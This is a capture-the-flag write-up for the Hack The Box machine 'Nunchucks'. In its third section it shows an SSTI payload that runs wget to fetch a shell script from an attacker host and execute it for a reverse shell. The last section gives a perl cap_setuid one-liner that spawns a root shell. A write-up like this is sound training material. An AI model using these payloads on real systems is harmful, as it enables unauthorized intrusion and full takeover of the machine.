---
source: Hack the Box
title: Nunchucks
tags: Web Exploitation, SSTI, Capabilities, perl
summary: **Nunchucks:** An SSTI vulnerability leads to remote code execution allowing the attacker to get a remote connection as "david". Further enumeration
reveals perl has the `CAP_SETUID` capability enabled, allowing the attacker to create and execute arbitrary perl scripts as root.
---

## [01] Port Scan and Service Discovery

```term
$ sudo nmap -p- -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.129.95.252
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
!!|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Issuer: commonName=Nunchucks-CA/countryName=US
|_http-title: Nunchucks - Landing Page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can add `nunchucks.htb` to our `/etc/hosts` file and begin enumeration of the web service.


## [02] Virtual Hosts Enumeration

```term
$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://nunchucks.htb -H "Host: FUZZ.nunchucks.htb" -k -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nunchucks.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.nunchucks.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

!!store                   [Status: 200, Size: 4029, Words: 1053, Lines: 102, Duration: 70ms]
```

We get a single hit on `store`. Let's add `store.nunchucks.htb` to the hosts file and poke around.


## [03] Finding SSTI in the Newsletter subscription

Playing with the **Notify Me** email submission, it seems to be blocking/sanitizing anything that is not an email address.
However, if we capture the request using `Burp Suite`, we can modify the POST request and find that the server is vulnerable
to `Server Side Template Injection (SSTI)`. The following request confirms this:
```term
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=q4ct1iOfNz0oH16T6MPjO1wv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Content-Length: 19
Origin: https://store.nunchucks.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"email":"{{7*7}}"}
```

And the response we get shows it executed the code written to the template:
```term
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 02 Aug 2026 01:47:28 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 75
Connection: keep-alive
X-Powered-By: Express
ETag: W/"4b-X79sUiArPHkUd9eYQd+2RjLRKtA"

{"response":"You will receive updates on the following email address: 49."}
```

We can now weaponize this to get a reverse shell on the system by altering the payload to fetch and execute a reverse shell
file that we have created and hosted using:
`{"email":"{{BaseURL}}/page?name={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('wget http://10.10.15.236/shell.sh -O /tmp/.shell.sh && bash /tmp/.shell.sh')\")()}}"}`


## [04] Shell as "david"
Checking for capabilities, we stumble upon something interesting:
```term
david@nunchucks:/$ getcap -r / 2>/dev/null
!!/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

perl has the `cap_setuid+ep` set, and there is an excellent article here `https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/apparmor` that shows how to bypass apparmor to get a root shell. We can utilize a one liner and spawn a
root shell:
```term
david@nunchucks:/tmp$ echo -e '#!/usr/bin/perl\nuse POSIX qw(strftime);\nuse POSIX qw(setuid);\nPOSIX::setuid(0);\nexec "/bin/sh"' > /tmp/pwned.pl; chmod +x /tmp/pwned.pl; ./pwned.pl
# whoami
root
```
